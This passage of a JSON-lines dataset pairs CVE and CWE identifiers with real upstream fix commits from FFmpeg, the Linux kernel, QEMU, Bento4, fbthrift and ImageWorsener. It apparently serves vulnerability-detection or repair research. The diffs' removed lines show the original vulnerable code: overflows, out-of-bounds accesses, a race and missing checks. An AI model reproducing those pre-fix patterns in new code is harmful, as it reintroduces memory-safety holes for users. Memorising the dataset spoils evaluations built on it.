b[1];\n+\treturn ((unsigned int)b[0]<<8) | (unsigned int)b[1];\n }\n \n IW_IMPL(unsigned int) iw_get_ui32be(const iw_byte *b)\n {\n-\treturn (b[0]<<24) | (b[1]<<16) | (b[2]<<8) | b[3];\n+\treturn ((unsigned int)b[0]<<24) | ((unsigned int)b[1]<<16) |\n+\t\t((unsigned int)b[2]<<8) | (unsigned int)b[3];\n }\n \n // Accepts a flag indicating the endianness.\n", "owner": "jsummers", "repo": "imageworsener", "source": "cve"}
{"CVE_ID": "CVE-2015-8365", "CWE_ID": "119", "category": "security", "commit_id": "4a9af07a49295e014b059c1ab624c40345af5892", "commit_message": "From 4a9af07a49295e014b059c1ab624c40345af5892 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michael@niedermayer.cc>\nDate: Sun, 15 Nov 2015 14:52:08 +0100\nSubject: [PATCH] avcodec/smacker: Check that the data size is a multiple of a\n sample vector\n\nFixes out of array access\nFixes: ce19e41f0ef1e52a23edc488faecdb58/asan_heap-oob_2504e97_4202_ffa0df1baed14022b9bfd4f8ac23d0cb.smk\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>\n---\n libavcodec/smacker.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n", "diff_code": "diff --git a/libavcodec/smacker.c b/libavcodec/smacker.c\nindex b2fc29b138..4014e8d04c 100644\n--- a/libavcodec/smacker.c\n+++ b/libavcodec/smacker.c\n@@ -670,6 +670,10 @@ static int smka_decode_frame(AVCodecContext *avctx, void *data,\n \n     /* get output buffer */\n     frame->nb_samples = unp_size / (avctx->channels * (bits + 1));\n+    if (unp_size % (avctx->channels * (bits + 1))) {\n+        av_log(avctx, AV_LOG_ERROR, \"unp_size %d is odd\\n\", unp_size);\n+        return AVERROR(EINVAL);\n+    }\n     if ((ret = ff_get_buffer(avctx, frame, 0)) < 0)\n         return ret;\n     samples  = (int16_t *)frame->data[0];\n-- \n2.11.0\n\n", "owner": "FFmpeg", "repo": "FFmpeg", "source": "cve"}
{"CVE_ID": "CVE-2013-1819", "CWE_ID": "20", "category": "security", "commit_id": "eb178619f930fa2ba2348de332a1ff1c66a31424", "commit_message": "From eb178619f930fa2ba2348de332a1ff1c66a31424 Mon Sep 17 00:00:00 2001\nFrom: Dave Chinner <dchinner@redhat.com>\nDate: Mon, 21 Jan 2013 23:53:52 +1100\nSubject: xfs: fix _xfs_buf_find oops on blocks beyond the filesystem end\n\nWhen _xfs_buf_find is passed an out of range address, it will fail\nto find a relevant struct xfs_perag and oops with a null\ndereference. This can happen when trying to walk a filesystem with a\nmetadata inode that has a partially corrupted extent map (i.e. the\nblock number returned is corrupt, but is otherwise intact) and we\ntry to read from the corrupted block address.\n\nIn this case, just fail the lookup. If it is readahead being issued,\nit will simply not be done, but if it is real read that fails we\nwill get an error being reported.  Ideally this case should result\nin an EFSCORRUPTED error being reported, but we cannot return an\nerror through xfs_buf_read() or xfs_buf_get() so this lookup failure\nmay result in ENOMEM or EIO errors being reported instead.\n\nSigned-off-by: Dave Chinner <dchinner@redhat.com>\nReviewed-by: Brian Foster <bfoster@redhat.com>\nReviewed-by: Ben Myers <bpm@sgi.com>\nSigned-off-by: Ben Myers <bpm@sgi.com>\n---\n fs/xfs/xfs_buf.c | 18 ++++++++++++++++++\n 1 file changed, 18 insertions(+)\n\n", "diff_code": "diff --git a/fs/xfs/xfs_buf.c b/fs/xfs/xfs_buf.c\nindex 56d1614760cf..689d72655ea6 100644\n--- a/fs/xfs/xfs_buf.c\n+++ b/fs/xfs/xfs_buf.c\n@@ -487,6 +487,7 @@ _xfs_buf_find(\n \tstruct rb_node\t\t*parent;\n \txfs_buf_t\t\t*bp;\n \txfs_daddr_t\t\tblkno = map[0].bm_bn;\n+\txfs_daddr_t\t\teofs;\n \tint\t\t\tnumblks = 0;\n \tint\t\t\ti;\n \n@@ -498,6 +499,23 @@ _xfs_buf_find(\n \tASSERT(!(numbytes < (1 << btp->bt_sshift)));\n \tASSERT(!(BBTOB(blkno) & (xfs_off_t)btp->bt_smask));\n \n+\t/*\n+\t * Corrupted block numbers can get through to here, unfortunately, so we\n+\t * have to check that the buffer falls within the filesystem bounds.\n+\t */\n+\teofs = XFS_FSB_TO_BB(btp->bt_mount, btp->bt_mount->m_sb.sb_dblocks);\n+\tif (blkno >= eofs) {\n+\t\t/*\n+\t\t * XXX (dgc): we should really be returning EFSCORRUPTED here,\n+\t\t * but none of the higher level infrastructure supports\n+\t\t * returning a specific error on buffer lookup failures.\n+\t\t */\n+\t\txfs_alert(btp->bt_mount,\n+\t\t\t  \"%s: Block out of range: block 0x%llx, EOFS 0x%llx \",\n+\t\t\t  __func__, blkno, eofs);\n+\t\treturn NULL;\n+\t}\n+\n \t/* get tree root */\n \tpag = xfs_perag_get(btp->bt_mount,\n \t\t\t\txfs_daddr_to_agno(btp->bt_mount, blkno));\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2010-4169", "CWE_ID": "399", "category": "security", "commit_id": "63bfd7384b119409685a17d5c58f0b56e5dc03da", "commit_message": "From 63bfd7384b119409685a17d5c58f0b56e5dc03da Mon Sep 17 00:00:00 2001\nFrom: Pekka Enberg <penberg@kernel.org>\nDate: Mon, 8 Nov 2010 21:29:07 +0200\nSubject: perf_events: Fix perf_counter_mmap() hook in mprotect()\n\nAs pointed out by Linus, commit dab5855 (\"perf_counter: Add mmap event hooks to\nmprotect()\") is fundamentally wrong as mprotect_fixup() can free 'vma' due to\nmerging. Fix the problem by moving perf_event_mmap() hook to\nmprotect_fixup().\n\nNote: there's another successful return path from mprotect_fixup() if old\nflags equal to new flags. We don't, however, need to call\nperf_event_mmap() there because 'perf' already knows the VMA is\nexecutable.\n\nReported-by: Dave Jones <davej@redhat.com>\nAnalyzed-by: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Ingo Molnar <mingo@elte.hu>\nReviewed-by: Peter Zijlstra <a.p.zijlstra@chello.nl>\nSigned-off-by: Pekka Enberg <penberg@kernel.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n mm/mprotect.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/mm/mprotect.c b/mm/mprotect.c\nindex 2d1bf7cf8851..4c5133873097 100644\n--- a/mm/mprotect.c\n+++ b/mm/mprotect.c\n@@ -211,6 +211,7 @@ success:\n \tmmu_notifier_invalidate_range_end(mm, start, end);\n \tvm_stat_account(mm, oldflags, vma->vm_file, -nrpages);\n \tvm_stat_account(mm, newflags, vma->vm_file, nrpages);\n+\tperf_event_mmap(vma);\n \treturn 0;\n \n fail:\n@@ -299,7 +300,6 @@ SYSCALL_DEFINE3(mprotect, unsigned long, start, size_t, len,\n \t\terror = mprotect_fixup(vma, &prev, nstart, tmp, newflags);\n \t\tif (error)\n \t\t\tgoto out;\n-\t\tperf_event_mmap(vma);\n \t\tnstart = tmp;\n \n \t\tif (nstart < prev->vm_end)\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "mjg59", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-17854", "CWE_ID": "190", "category": "security", "commit_id": "bb7f0f989ca7de1153bd128a40a71709e339fa03", "commit_message": "From bb7f0f989ca7de1153bd128a40a71709e339fa03 Mon Sep 17 00:00:00 2001\nFrom: Alexei Starovoitov <ast@kernel.org>\nDate: Mon, 18 Dec 2017 20:12:00 -0800\nSubject: [PATCH] bpf: fix integer overflows\n\nThere were various issues related to the limited size of integers used in\nthe verifier:\n - `off + size` overflow in __check_map_access()\n - `off + reg->off` overflow in check_mem_access()\n - `off + reg->var_off.value` overflow or 32-bit truncation of\n   `reg->var_off.value` in check_mem_access()\n - 32-bit truncation in check_stack_boundary()\n\nMake sure that any integer math cannot overflow by not allowing\npointer math with large values.\n\nAlso reduce the scope of \"scalar op scalar\" tracking.\n\nFixes: f1174f77b50c (\"bpf/verifier: rework value tracking\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>\n---\n include/linux/bpf_verifier.h |  4 +--\n kernel/bpf/verifier.c        | 48 ++++++++++++++++++++++++++++++++++++\n 2 files changed, 50 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/include/linux/bpf_verifier.h b/include/linux/bpf_verifier.h\nindex c561b986bab0e..1632bb13ad8ae 100644\n--- a/include/linux/bpf_verifier.h\n+++ b/include/linux/bpf_verifier.h\n@@ -15,11 +15,11 @@\n  * In practice this is far bigger than any realistic pointer offset; this limit\n  * ensures that umax_value + (int)off + (int)size cannot overflow a u64.\n  */\n-#define BPF_MAX_VAR_OFF\t(1ULL << 31)\n+#define BPF_MAX_VAR_OFF\t(1 << 29)\n /* Maximum variable size permitted for ARG_CONST_SIZE[_OR_ZERO].  This ensures\n  * that converting umax_value to int cannot overflow.\n  */\n-#define BPF_MAX_VAR_SIZ\tINT_MAX\n+#define BPF_MAX_VAR_SIZ\t(1 << 29)\n \n /* Liveness marks, used for registers and spilled-regs (in stack slots).\n  * Read marks propagate upwards until they find a write mark; they record that\ndiff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c\nindex 982bd9ec721ae..86dfe6b5c2436 100644\n--- a/kernel/bpf/verifier.c\n+++ b/kernel/bpf/verifier.c\n@@ -1819,6 +1819,41 @@ static bool signed_sub_overflows(s64 a, s64 b)\n \treturn res > a;\n }\n \n+static bool check_reg_sane_offset(struct bpf_verifier_env *env,\n+\t\t\t\t  const struct bpf_reg_state *reg,\n+\t\t\t\t  enum bpf_reg_type type)\n+{\n+\tbool known = tnum_is_const(reg->var_off);\n+\ts64 val = reg->var_off.value;\n+\ts64 smin = reg->smin_value;\n+\n+\tif (known && (val >= BPF_MAX_VAR_OFF || val <= -BPF_MAX_VAR_OFF)) {\n+\t\tverbose(env, \"math between %s pointer and %lld is not allowed\\n\",\n+\t\t\treg_type_str[type], val);\n+\t\treturn false;\n+\t}\n+\n+\tif (reg->off >= BPF_MAX_VAR_OFF || reg->off <= -BPF_MAX_VAR_OFF) {\n+\t\tverbose(env, \"%s pointer offset %d is not allowed\\n\",\n+\t\t\treg_type_str[type], reg->off);\n+\t\treturn false;\n+\t}\n+\n+\tif (smin == S64_MIN) {\n+\t\tverbose(env, \"math between %s pointer and register with unbounded min value is not allowed\\n\",\n+\t\t\treg_type_str[type]);\n+\t\treturn false;\n+\t}\n+\n+\tif (smin >= BPF_MAX_VAR_OFF || smin <= -BPF_MAX_VAR_OFF) {\n+\t\tverbose(env, \"value %lld makes %s pointer be out of bounds\\n\",\n+\t\t\tsmin, reg_type_str[type]);\n+\t\treturn false;\n+\t}\n+\n+\treturn true;\n+}\n+\n /* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off.\n  * Caller should also handle BPF_MOV case separately.\n  * If we return -EACCES, caller may want to try again treating pointer as a\n@@ -1887,6 +1922,10 @@ static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,\n \tdst_reg->type = ptr_reg->type;\n \tdst_reg->id = ptr_reg->id;\n \n+\tif (!check_reg_sane_offset(env, off_reg, ptr_reg->type) ||\n+\t    !check_reg_sane_offset(env, ptr_reg, ptr_reg->type))\n+\t\treturn -EINVAL;\n+\n \tswitch (opcode) {\n \tcase BPF_ADD:\n \t\t/* We can take a fixed offset as long as it doesn't overflow\n@@ -2017,6 +2056,9 @@ static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,\n \t\treturn -EACCES;\n \t}\n \n+\tif (!check_reg_sane_offset(env, dst_reg, ptr_reg->type))\n+\t\treturn -EINVAL;\n+\n \t__update_reg_bounds(dst_reg);\n \t__reg_deduce_bounds(dst_reg);\n \t__reg_bound_offset(dst_reg);\n@@ -2046,6 +2088,12 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,\n \tsrc_known = tnum_is_const(src_reg.var_off);\n \tdst_known = tnum_is_const(dst_reg->var_off);\n \n+\tif (!src_known &&\n+\t    opcode != BPF_ADD && opcode != BPF_SUB && opcode != BPF_AND) {\n+\t\t__mark_reg_unknown(dst_reg);\n+\t\treturn 0;\n+\t}\n+\n \tswitch (opcode) {\n \tcase BPF_ADD:\n \t\tif (signed_add_overflows(dst_reg->smin_value, smin_val) ||\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2013-7014", "CWE_ID": "189", "category": "security", "commit_id": "86736f59d6a527d8bc807d09b93f971c0fe0bb07", "commit_message": "From 86736f59d6a527d8bc807d09b93f971c0fe0bb07 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Fri, 30 Aug 2013 23:14:32 +0200\nSubject: [PATCH] avcodec/pngdsp: fix (un)signed type in end comparission\n\nFixes out of array accesses\nFixes Ticket2919\n\nFound_by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec/pngdsp.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/libavcodec/pngdsp.c b/libavcodec/pngdsp.c\nindex 0d247759cc0..5ab1c351b25 100644\n--- a/libavcodec/pngdsp.c\n+++ b/libavcodec/pngdsp.c\n@@ -31,7 +31,7 @@\n static void add_bytes_l2_c(uint8_t *dst, uint8_t *src1, uint8_t *src2, int w)\n {\n     long i;\n-    for (i = 0; i <= w - sizeof(long); i += sizeof(long)) {\n+    for (i = 0; i <= w - (int)sizeof(long); i += sizeof(long)) {\n         long a = *(long *)(src1 + i);\n         long b = *(long *)(src2 + i);\n         *(long *)(dst + i) = ((a & pb_7f) + (b & pb_7f)) ^ ((a ^ b) & pb_80);\n", "owner": "FFmpeg", "repo": "FFmpeg", "source": "cve"}
{"CVE_ID": "CVE-2016-2546", "CWE_ID": "362", "category": "security", "commit_id": "af368027a49a751d6ff4ee9e3f9961f35bb4fede", "commit_message": "From af368027a49a751d6ff4ee9e3f9961f35bb4fede Mon Sep 17 00:00:00 2001\nFrom: Takashi Iwai <tiwai@suse.de>\nDate: Wed, 13 Jan 2016 17:48:01 +0100\nSubject: [PATCH] ALSA: timer: Fix race among timer ioctls\n\nALSA timer ioctls have an open race and this may lead to a\nuse-after-free of timer instance object.  A simplistic fix is to make\neach ioctl exclusive.  We have already tread_sem for controlling the\ntread, and extend this as a global mutex to be applied to each ioctl.\n\nThe downside is, of course, the worse concurrency.  But these ioctls\naren't to be parallel accessible, in anyway, so it should be fine to\nserialize there.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>\n---\n sound/core/timer.c | 32 +++++++++++++++++++-------------\n 1 file changed, 19 insertions(+), 13 deletions(-)\n\n", "diff_code": "diff --git a/sound/core/timer.c b/sound/core/timer.c\nindex 9241784dfe7dd..3810ee8f12051 100644\n--- a/sound/core/timer.c\n+++ b/sound/core/timer.c\n@@ -73,7 +73,7 @@ struct snd_timer_user {\n \tstruct timespec tstamp;\t\t/* trigger tstamp */\n \twait_queue_head_t qchange_sleep;\n \tstruct fasync_struct *fasync;\n-\tstruct mutex tread_sem;\n+\tstruct mutex ioctl_lock;\n };\n \n /* list of timers */\n@@ -1253,7 +1253,7 @@ static int snd_timer_user_open(struct inode *inode, struct file *file)\n \t\treturn -ENOMEM;\n \tspin_lock_init(&tu->qlock);\n \tinit_waitqueue_head(&tu->qchange_sleep);\n-\tmutex_init(&tu->tread_sem);\n+\tmutex_init(&tu->ioctl_lock);\n \ttu->ticks = 1;\n \ttu->queue_size = 128;\n \ttu->queue = kmalloc(tu->queue_size * sizeof(struct snd_timer_read),\n@@ -1273,8 +1273,10 @@ static int snd_timer_user_release(struct inode *inode, struct file *file)\n \tif (file->private_data) {\n \t\ttu = file->private_data;\n \t\tfile->private_data = NULL;\n+\t\tmutex_lock(&tu->ioctl_lock);\n \t\tif (tu->timeri)\n \t\t\tsnd_timer_close(tu->timeri);\n+\t\tmutex_unlock(&tu->ioctl_lock);\n \t\tkfree(tu->queue);\n \t\tkfree(tu->tqueue);\n \t\tkfree(tu);\n@@ -1512,7 +1514,6 @@ static int snd_timer_user_tselect(struct file *file,\n \tint err = 0;\n \n \ttu = file->private_data;\n-\tmutex_lock(&tu->tread_sem);\n \tif (tu->timeri) {\n \t\tsnd_timer_close(tu->timeri);\n \t\ttu->timeri = NULL;\n@@ -1556,7 +1557,6 @@ static int snd_timer_user_tselect(struct file *file,\n \t}\n \n       __err:\n-      \tmutex_unlock(&tu->tread_sem);\n \treturn err;\n }\n \n@@ -1769,7 +1769,7 @@ enum {\n \tSNDRV_TIMER_IOCTL_PAUSE_OLD = _IO('T', 0x23),\n };\n \n-static long snd_timer_user_ioctl(struct file *file, unsigned int cmd,\n+static long __snd_timer_user_ioctl(struct file *file, unsigned int cmd,\n \t\t\t\t unsigned long arg)\n {\n \tstruct snd_timer_user *tu;\n@@ -1786,17 +1786,11 @@ static long snd_timer_user_ioctl(struct file *file, unsigned int cmd,\n \t{\n \t\tint xarg;\n \n-\t\tmutex_lock(&tu->tread_sem);\n-\t\tif (tu->timeri)\t{\t/* too late */\n-\t\t\tmutex_unlock(&tu->tread_sem);\n+\t\tif (tu->timeri)\t/* too late */\n \t\t\treturn -EBUSY;\n-\t\t}\n-\t\tif (get_user(xarg, p)) {\n-\t\t\tmutex_unlock(&tu->tread_sem);\n+\t\tif (get_user(xarg, p))\n \t\t\treturn -EFAULT;\n-\t\t}\n \t\ttu->tread = xarg ? 1 : 0;\n-\t\tmutex_unlock(&tu->tread_sem);\n \t\treturn 0;\n \t}\n \tcase SNDRV_TIMER_IOCTL_GINFO:\n@@ -1829,6 +1823,18 @@ static long snd_timer_user_ioctl(struct file *file, unsigned int cmd,\n \treturn -ENOTTY;\n }\n \n+static long snd_timer_user_ioctl(struct file *file, unsigned int cmd,\n+\t\t\t\t unsigned long arg)\n+{\n+\tstruct snd_timer_user *tu = file->private_data;\n+\tlong ret;\n+\n+\tmutex_lock(&tu->ioctl_lock);\n+\tret = __snd_timer_user_ioctl(file, cmd, arg);\n+\tmutex_unlock(&tu->ioctl_lock);\n+\treturn ret;\n+}\n+\n static int snd_timer_user_fasync(int fd, struct file * file, int on)\n {\n \tstruct snd_timer_user *tu;\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-14640", "CWE_ID": "476", "category": "security", "commit_id": "2f267f89f957088197f4b1fc254632d1645b415d", "commit_message": "From 2f267f89f957088197f4b1fc254632d1645b415d Mon Sep 17 00:00:00 2001\nFrom: Gilles Boccon-Gibod <bok@bok.net>\nDate: Sat, 9 Sep 2017 10:42:03 -0700\nSubject: [PATCH] fix for #183\n\n---\n Source/C++/Core/Ap4AtomSampleTable.cpp | 6 ++++--\n 1 file changed, 4 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/Source/C++/Core/Ap4AtomSampleTable.cpp b/Source/C++/Core/Ap4AtomSampleTable.cpp\nindex 77d11191..ec3b0806 100644\n--- a/Source/C++/Core/Ap4AtomSampleTable.cpp\n+++ b/Source/C++/Core/Ap4AtomSampleTable.cpp\n@@ -140,8 +140,10 @@ AP4_AtomSampleTable::GetSample(AP4_Ordinal index,\n     AP4_UI32 cts_offset = 0;\n     AP4_UI64 dts        = 0;\n     AP4_UI32 duration   = 0;\n-    result = m_SttsAtom->GetDts(index, dts, &duration);\n-    if (AP4_FAILED(result)) return result;\n+    if (m_SttsAtom) {\n+        result = m_SttsAtom->GetDts(index, dts, &duration);\n+        if (AP4_FAILED(result)) return result;\n+    }\n     sample.SetDuration(duration);\n     sample.SetDts(dts);\n     if (m_CttsAtom == NULL) {\n", "owner": "axiomatic-systems", "repo": "Bento4", "source": "cve"}
{"CVE_ID": "CVE-2017-5578", "CWE_ID": "399", "category": "security", "commit_id": "204f01b30975923c64006f8067f0937b91eea68b", "commit_message": "From 204f01b30975923c64006f8067f0937b91eea68b Mon Sep 17 00:00:00 2001\nFrom: Li Qiang <liq3ea@gmail.com>\nDate: Thu, 29 Dec 2016 04:28:41 -0500\nSubject: [PATCH] virtio-gpu: fix memory leak in resource attach backing\n\nIn the resource attach backing function, everytime it will\nallocate 'res->iov' thus can leading a memory leak. This\npatch avoid this.\n\nSigned-off-by: Li Qiang <liq3ea@gmail.com>\nMessage-id: 1483003721-65360-1-git-send-email-liq3ea@gmail.com\nSigned-off-by: Gerd Hoffmann <kraxel@redhat.com>\n---\n hw/display/virtio-gpu.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n", "diff_code": "diff --git a/hw/display/virtio-gpu.c b/hw/display/virtio-gpu.c\nindex 6a26258..ca88cf4 100644\n--- a/hw/display/virtio-gpu.c\n+++ b/hw/display/virtio-gpu.c\n@@ -714,6 +714,11 @@ virtio_gpu_resource_attach_backing(VirtIOGPU *g,\n         return;\n     }\n \n+    if (res->iov) {\n+        cmd->error = VIRTIO_GPU_RESP_ERR_UNSPEC;\n+        return;\n+    }\n+\n     ret = virtio_gpu_create_mapping_iov(&ab, cmd, &res->addrs, &res->iov);\n     if (ret != 0) {\n         cmd->error = VIRTIO_GPU_RESP_ERR_UNSPEC;\n-- \n1.8.3.1\n\n", "owner": "qemu", "repo": "qemu", "source": "cve"}
{"CVE_ID": "CVE-2019-3565", "CWE_ID": "20", "category": "security", "commit_id": "01686e15ec77ccb4d49a77d5bce3a01601e54d64", "commit_message": "From 01686e15ec77ccb4d49a77d5bce3a01601e54d64 Mon Sep 17 00:00:00 2001\nFrom: David Goldblatt <davidgoldblatt@fb.com>\nDate: Thu, 2 May 2019 18:52:10 -0700\nSubject: [PATCH] Throw on skipping an invalid type.\n\nSummary:\nCertain values (e.g.) T_STOP should not appear as a skip type. Allowing them to\ncan cause thrift to loop unboundedly.\n\nReviewed By: spalamarchuk\n\nDifferential Revision: D15102451\n\nfbshipit-source-id: c08d52f44f37e9c212d3480233ac217105586c9f\n---\n thrift/lib/cpp/protocol/TProtocol.h | 5 +++--\n 1 file changed, 3 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/thrift/lib/cpp/protocol/TProtocol.h b/thrift/lib/cpp/protocol/TProtocol.h\nindex 9c5d91300..273ff10be 100644\n--- a/thrift/lib/cpp/protocol/TProtocol.h\n+++ b/thrift/lib/cpp/protocol/TProtocol.h\n@@ -165,8 +165,9 @@ uint32_t skip(Protocol_& prot, TType arg_type) {\n       result += prot.readListEnd();\n       return result;\n     }\n-    default:\n-      return 0;\n+    default: {\n+      TProtocolException::throwInvalidSkipType(arg_type);\n+    }\n   }\n }\n \n", "owner": "facebook", "repo": "fbthrift", "source": "cve"}
{"CVE_ID": "CVE-2016-5829", "CWE_ID": "119", "category": "security", "commit_id": "93a2001bdfd5376c3dc2158653034c20392d15c5", "commit_message": "From 93a2001bdfd5376c3dc2158653034c20392d15c5 Mon Sep 17 00:00:00 2001\nFrom: Scott Bauer <sbauer@plzdonthack.me>\nDate: Thu, 23 Jun 2016 08:59:47 -0600\nSubject: [PATCH] HID: hiddev: validate num_values for HIDIOCGUSAGES,\n HIDIOCSUSAGES commands\n\nThis patch validates the num_values parameter from userland during the\nHIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set\nto HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter\nleading to a heap overflow.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Scott Bauer <sbauer@plzdonthack.me>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>\n---\n drivers/hid/usbhid/hiddev.c | 10 +++++-----\n 1 file changed, 5 insertions(+), 5 deletions(-)\n\n", "diff_code": "diff --git a/drivers/hid/usbhid/hiddev.c b/drivers/hid/usbhid/hiddev.c\nindex 2f1ddca6f2e0a..700145b150889 100644\n--- a/drivers/hid/usbhid/hiddev.c\n+++ b/drivers/hid/usbhid/hiddev.c\n@@ -516,13 +516,13 @@ static noinline int hiddev_ioctl_usage(struct hiddev *hiddev, unsigned int cmd,\n \t\t\t\t\tgoto inval;\n \t\t\t} else if (uref->usage_index >= field->report_count)\n \t\t\t\tgoto inval;\n-\n-\t\t\telse if ((cmd == HIDIOCGUSAGES || cmd == HIDIOCSUSAGES) &&\n-\t\t\t\t (uref_multi->num_values > HID_MAX_MULTI_USAGES ||\n-\t\t\t\t  uref->usage_index + uref_multi->num_values > field->report_count))\n-\t\t\t\tgoto inval;\n \t\t}\n \n+\t\tif ((cmd == HIDIOCGUSAGES || cmd == HIDIOCSUSAGES) &&\n+\t\t    (uref_multi->num_values > HID_MAX_MULTI_USAGES ||\n+\t\t     uref->usage_index + uref_multi->num_values > field->report_count))\n+\t\t\tgoto inval;\n+\n \t\tswitch (cmd) {\n \t\tcase HIDIOCGUSAGE:\n \t\t\turef->value = field->value[uref->usage_index];\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-16535", "CWE_ID": "125", "category": "security", "commit_id": "1c0edc3633b56000e18d82fc241e3995ca18a69e", "commit_message": "From 1c0edc3633b56000e18d82fc241e3995ca18a69e Mon Sep 17 00:00:00 2001\nFrom: Alan Stern <stern@rowland.harvard.edu>\nDate: Wed, 18 Oct 2017 12:49:38 -0400\nSubject: [PATCH] USB: core: fix out-of-bounds access bug in\n usb_get_bos_descriptor()\n\nAndrey used the syzkaller fuzzer to find an out-of-bounds memory\naccess in usb_get_bos_descriptor().  The code wasn't checking that the\nnext usb_dev_cap_header structure could fit into the remaining buffer\nspace.\n\nThis patch fixes the error and also reduces the bNumDeviceCaps field\nin the header to match the actual number of capabilities found, in\ncases where there are fewer than expected.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: Alan Stern <stern@rowland.harvard.edu>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCC: <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers/usb/core/config.c | 6 ++++--\n 1 file changed, 4 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/drivers/usb/core/config.c b/drivers/usb/core/config.c\nindex 68b54bd88d1eb..883549ee946cb 100644\n--- a/drivers/usb/core/config.c\n+++ b/drivers/usb/core/config.c\n@@ -960,10 +960,12 @@ int usb_get_bos_descriptor(struct usb_device *dev)\n \tfor (i = 0; i < num; i++) {\n \t\tbuffer += length;\n \t\tcap = (struct usb_dev_cap_header *)buffer;\n-\t\tlength = cap->bLength;\n \n-\t\tif (total_len < length)\n+\t\tif (total_len < sizeof(*cap) || total_len < cap->bLength) {\n+\t\t\tdev->bos->desc->bNumDeviceCaps = i;\n \t\t\tbreak;\n+\t\t}\n+\t\tlength = cap->bLength;\n \t\ttotal_len -= length;\n \n \t\tif (cap->bDescriptorType != USB_DT_DEVICE_CAPABILITY) {\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-12190", "CWE_ID": "119", "category": "security", "commit_id": "2b04e8f6bbb196cab4b232af0f8d48ff2c7a8058", "commit_message": "From 2b04e8f6bbb196cab4b232af0f8d48ff2c7a8058 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Sat, 23 Sep 2017 15:51:23 -0400\nSubject: [PATCH] more bio_map_user_iov() leak fixes\n\nwe need to take care of failure exit as well - pages already\nin bio should be dropped by analogue of bio_unmap_pages(),\nsince their refcounts had been bumped only once per reference\nin bio.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n block/bio.c | 14 +++++++++-----\n 1 file changed, 9 insertions(+), 5 deletions(-)\n\n", "diff_code": "diff --git a/block/bio.c b/block/bio.c\nindex 0d6439e89acb7..9e9606d26cc6a 100644\n--- a/block/bio.c\n+++ b/block/bio.c\n@@ -1331,6 +1331,7 @@ struct bio *bio_map_user_iov(struct request_queue *q,\n \tint ret, offset;\n \tstruct iov_iter i;\n \tstruct iovec iov;\n+\tstruct bio_vec *bvec;\n \n \tiov_for_each(iov, i, *iter) {\n \t\tunsigned long uaddr = (unsigned long) iov.iov_base;\n@@ -1375,7 +1376,12 @@ struct bio *bio_map_user_iov(struct request_queue *q,\n \t\tret = get_user_pages_fast(uaddr, local_nr_pages,\n \t\t\t\t(iter->type & WRITE) != WRITE,\n \t\t\t\t&pages[cur_page]);\n-\t\tif (ret < local_nr_pages) {\n+\t\tif (unlikely(ret < local_nr_pages)) {\n+\t\t\tfor (j = cur_page; j < page_limit; j++) {\n+\t\t\t\tif (!pages[j])\n+\t\t\t\t\tbreak;\n+\t\t\t\tput_page(pages[j]);\n+\t\t\t}\n \t\t\tret = -EFAULT;\n \t\t\tgoto out_unmap;\n \t\t}\n@@ -1431,10 +1437,8 @@ struct bio *bio_map_user_iov(struct request_queue *q,\n \treturn bio;\n \n  out_unmap:\n-\tfor (j = 0; j < nr_pages; j++) {\n-\t\tif (!pages[j])\n-\t\t\tbreak;\n-\t\tput_page(pages[j]);\n+\tbio_for_each_segment_all(bvec, bio, j) {\n+\t\tput_page(bvec->bv_page);\n \t}\n  out:\n \tkfree(pages);\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
